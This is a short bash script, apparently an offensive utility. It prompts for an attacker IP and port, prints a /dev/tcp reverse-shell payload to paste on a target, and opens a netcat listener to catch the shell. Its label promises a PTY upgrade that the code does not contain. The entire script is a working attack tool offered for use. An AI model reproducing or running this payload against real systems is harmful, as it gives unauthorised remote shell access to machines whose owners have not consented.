#!/bin/bash

RED='\033[0;31m'
NC='\033[0m'

echo "Reverse shell handler with PTY upgrade abilities"

read -p "LHOST IP: " LHOST
read -p "LHOST PORT: " LPORT

echo
echo -e "Here's Your Payload: $RED echo 'sh -i >& /dev/tcp/$LHOST/$LPORT 0>&1' > /tmp/sysnet.sh $NC"
echo
echo "Paste payload on target and wait for the shell!"
echo

nc -lvnp $LPORT
